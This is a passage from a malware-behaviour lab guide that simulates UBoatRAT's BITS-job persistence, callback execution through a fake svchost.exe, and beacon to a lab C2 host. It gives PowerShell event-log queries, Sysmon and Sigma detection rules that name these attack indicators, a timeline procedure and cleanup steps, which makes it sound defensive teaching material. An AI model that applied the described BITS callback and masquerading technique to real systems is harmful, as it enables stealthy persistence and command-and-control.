  Format-Table -AutoSize -Wrap
```

Search for the three known lab job names:

```powershell
$BitsEvents |
  Where-Object {
    $_.Message -match (
      "UBoatLab_Persistence|" +
      "UBoatLab_ManualDownload|" +
      "UBoatLab_ManualCallback"
    )
  } |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Id, Message
```

Detection opportunities:

- job created by `bitsadmin.exe`;
- `/setnotifycmdline` use;
- remote URL containing a non-standard port;
- destination in a user-writable lab path;
- callback executable in a user-writable directory;
- suspicious or misleading job names;
- repeated job errors to an unknown destination.

---

## Phase 16 — Sysmon Detection

### Event ID 1 — Process creation

Detect:

```text
bitsadmin.exe with /setnotifycmdline
bitsadmin.exe with /addfile
runtime\svchost.exe --bits-callback
svchost.exe outside C:\Windows\
```

Query:

```powershell
$ProcessEvents = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 1
  StartTime = $SessionStart
}

$ProcessEvents |
  Where-Object {
    $_.Message -match (
      "bitsadmin\.exe|" +
      "WinSvcHelper\.exe|" +
      "\\runtime\\svchost\.exe"
    )
  } |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Message
```

### Event ID 3 — Network connections

Detect:

```text
runtime\svchost.exe -> TCP/9001
svchost.exe -> non-standard HTTP service on TCP/8080
```

```powershell
$NetworkEvents = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 3
  StartTime = $SessionStart
}

$NetworkEvents |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Message
```

### Event ID 11 — File creation

Detect:

```text
svchost.exe copied into a user-writable directory
BITS-delivered file under a desktop lab path
init.bat and callback artifacts
```

```powershell
$FileEvents = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  Id        = 11
  StartTime = $SessionStart
}

$FileEvents |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Message
```

### Event ID 22 — DNS query

The configuration attempts to record:

```text
uboat-c2.test
```

However, the hostname is resolved through the Windows `hosts` file. Depending on the Windows and Sysmon build, a DNS event may not be generated.

Treat Event ID 22 as useful corroboration, not a mandatory success condition.

---

## Phase 17 — Security Event ID 4688

Query relevant process creation events:

```powershell
Get-WinEvent -FilterHashtable @{
  LogName   = "Security"
  Id        = 4688
  StartTime = $SessionStart
} |
  Where-Object {
    $_.Message -match (
      "WinSvcHelper\.exe|" +
      "bitsadmin\.exe|" +
      "\\runtime\\svchost\.exe|" +
      "\\runtime\\init\.bat"
    )
  } |
  Sort-Object TimeCreated |
  Format-List TimeCreated, Message
```

Use Security 4688 to corroborate:

- original execution;
- command line;
- account;
- creator process;
- callback executable path.

---

## Phase 18 — Timeline Reconstruction

Create a combined timeline:

```powershell
$BitsTimeline = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Bits-Client/Operational"
  StartTime = $SessionStart
} |
  Where-Object {
    $_.Message -match "UBoatLab_"
  } |
  Select-Object TimeCreated,
    @{Name="Source"; Expression={"BITS"}},
    @{Name="EventId"; Expression={$_.Id}},
    @{Name="Detail"; Expression={
      ($_.Message -split "\r?\n" |
        Select-Object -First 2) -join " | "
    }}

$SysmonTimeline = Get-WinEvent -FilterHashtable @{
  LogName   = "Microsoft-Windows-Sysmon/Operational"
  StartTime = $SessionStart
} |
  Where-Object {
    $_.Id -in @(1, 3, 11, 22)
  } |
  Where-Object {
    $_.Message -match (
      "UBoatRAT|" +
      "WinSvcHelper|" +
      "UBoatLab_|" +
      "\\runtime\\svchost\.exe|" +
      "uboat-c2\.test"
    )
  } |
  Select-Object TimeCreated,
    @{Name="Source"; Expression={"Sysmon"}},
    @{Name="EventId"; Expression={$_.Id}},
    @{Name="Detail"; Expression={
      ($_.Message -split "\r?\n" |
        Select-Object -First 2) -join " | "
    }}

$SecurityTimeline = Get-WinEvent -FilterHashtable @{
  LogName   = "Security"
  Id        = 4688
  StartTime = $SessionStart
} |
  Where-Object {
    $_.Message -match (
      "WinSvcHelper|" +
      "bitsadmin|" +
      "\\runtime\\svchost\.exe"
    )
  } |
  Select-Object TimeCreated,
    @{Name="Source"; Expression={"Security"}},
    @{Name="EventId"; Expression={$_.Id}},
    @{Name="Detail"; Expression={
      ($_.Message -split "\r?\n" |
        Select-Object -First 2) -join " | "
    }}

($BitsTimeline + $SysmonTimeline + $SecurityTimeline) |
  Sort-Object TimeCreated |
  Format-Table TimeCreated, Source, EventId, Detail `
    -AutoSize `
    -Wrap
```

Map the events to:

| Stage | Expected evidence |
|---|---|
| Initial execution | Security 4688 and Sysmon 1 for `WinSvcHelper.exe` |
| Runtime staging | Sysmon 11 for files under `runtime` |
| BITS setup | Sysmon 1 and Security 4688 for `bitsadmin.exe` |
| Transfer | BITS Operational plus network traffic to TCP/8080 |
| Callback | Sysmon 1 for `runtime\svchost.exe --bits-callback` |
| Resolver retrieval | HTTP `/resolver/README.md` and Sysmon network telemetry |
| Beacon | Sysmon 3 and PCAP for TCP/9001 |
| Server validation | Ubuntu `server.log` and `beacon.log` |

<!-- SCREENSHOT PLACEHOLDER:
Combined timeline output showing the full ordered chain.
-->

---

## Phase 19 — Sigma Rules

### Rule 1 — BITSAdmin registers a notification command

```yaml
title: BITSAdmin Registers a Completion Command
id: 9cf728d7-1a40-4b8e-a731-d32b67f1c126
status: experimental
description: >
  Detects bitsadmin.exe registering a command to execute through
  SetNotifyCmdLine. This behavior can chain a BITS transfer into
  post-transfer execution.
references:
  - https://attack.mitre.org/techniques/T1197/
author: UBoatRAT Behavior Lab
date: 2026-07-21
tags:
  - attack.defense_evasion
  - attack.persistence
  - attack.t1197
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\bitsadmin.exe'
    CommandLine|contains: '/setnotifycmdline'
  condition: selection
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Rare legitimate administrative BITS workflows
  - Internal deployment tooling using bitsadmin callbacks
level: high
```

### Rule 2 — `svchost.exe` outside Windows directories

```yaml
title: Svchost Executed Outside Windows Directories
id: 87cc37e4-3591-4bf8-831d-e0c750805c67
status: experimental
description: >
  Detects an executable named svchost.exe launched from outside expected
  Windows system directories. Malware and simulators may use this name
  to masquerade as a trusted service host.
references:
  - https://attack.mitre.org/techniques/T1036/
author: UBoatRAT Behavior Lab
date: 2026-07-21
tags:
  - attack.defense_evasion
  - attack.t1036
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\svchost.exe'
  filter_system32:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and not filter_system32
fields:
  - Image
  - CommandLine
  - ParentImage
  - User
falsepositives:
  - Testing tools deliberately using a system-like filename
  - Software packaged with a file named svchost.exe
level: high
```

### Rule 3 — User-writable `svchost.exe` connects to an unusual port

```yaml
title: User-Writable Svchost Network Connection
id: 7a0dbdd0-967d-4ddf-b511-e9633011b84e
status: experimental
description: >
  Detects an executable named svchost.exe outside Windows system paths
  initiating a network connection. The lab simulator connects to a fixed
  private TCP listener on port 9001.
author: UBoatRAT Behavior Lab
date: 2026-07-21
tags:
  - attack.command_and_control
  - attack.defense_evasion
  - attack.t1036
logsource:
  product: windows
  category: network_connection
detection:
  selection:
    Image|endswith: '\svchost.exe'
  selection_port:
    DestinationPort: 9001
  filter_system32:
    Image|startswith:
      - 'C:\Windows\System32\'
      - 'C:\Windows\SysWOW64\'
  condition: selection and selection_port and not filter_system32
fields:
  - Image
  - DestinationIp
  - DestinationHostname
  - DestinationPort
  - User
falsepositives:
  - Controlled security testing
level: high
```

---

## Phase 20 — Multi-Signal Correlation

A strong production detection should correlate independent signals on the same host.

```text
Within five minutes on the same endpoint:

1. bitsadmin.exe executes with /setnotifycmdline
2. a BITS job references an unusual URL or non-standard port
3. svchost.exe executes outside C:\Windows\
4. that executable connects to the resolver or beacon endpoint
5. files are created under the same user-writable runtime directory

Result:
High-confidence BITS callback abuse with masquerading and network activity
```

Explain why each individual signal may produce false positives and why the full sequence is substantially stronger.

---

# Session Cleanup

## Student workflow

Stop the Ubuntu server with:

```text
CTRL+C
```

Close the lab session.

The platform reverts both VMs to the shared snapshot. This is the authoritative cleanup mechanism.

Do not remove all BITS jobs from the shared VM indiscriminately.

## Author dry-run cleanup without snapshot revert

Use this only while developing or validating the lab.

Remove only UBoatRAT-specific jobs:

```powershell
Import-Module BitsTransfer

$LabJobNames = @(
  "UBoatLab_Persistence",
  "UBoatLab_ManualDownload",
  "UBoatLab_ManualCallback"
)

Get-BitsTransfer -AllUsers |
  Where-Object {
    $_.DisplayName -in $LabJobNames
  } |
  Remove-BitsTransfer
```

Remove only lab-generated runtime state:

```powershell
Remove-Item `
  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\runtime" `
  -Recurse `
  -Force `
  -ErrorAction SilentlyContinue

Remove-Item `
  "C:\Users\Administrator\Desktop\Labs\UBoatRAT\UBoatRAT_Lab_Blocked.log" `
  -Force `
  -ErrorAction SilentlyContinue
```

Do not remove other laboratories' artifacts, jobs, tools, or shared telemetry configuration.

---

# Conclusion

In this lab, you investigated a windowless executable and reconstructed a complete behavioral chain from independent evidence.

As a malware analyst, you identified:

- local staging under a user-writable runtime directory;
- execution of `bitsadmin.exe`;
- creation of a BITS download job;
- registration of a completion callback;
- execution of a misleadingly named `svchost.exe`;
- retrieval and decoding of a dead-drop resolver;
- transmission of one fixed XOR-encoded beacon.

As a red team operator, you reproduced:

- a BITS download;
- BITS callback execution;
- Base64 endpoint decoding;
- the fixed XOR encoding;
- a one-way TCP beacon with no command response.

As a detection engineer, you correlated:

- BITS Operational events;
- Sysmon process, network, file, and optional DNS telemetry;
- Security Event ID 4688;
- Procmon evidence;
- packet capture;
- Ubuntu server logs.

The key lesson is not that one Windows binary or one port is inherently malicious. The detection value comes from the sequence:

```text
BITS job
→ notification command
→ system-like executable in a user-writable path
→ dead-drop endpoint resolution
→ unusual outbound connection
```

That sequence is observable, explainable, and suitable for layered detection.

<br>

# Finished?

[Back to Card's Main Page](../Backround_Intelligent_Transfer_Service_As_Exfil.md)


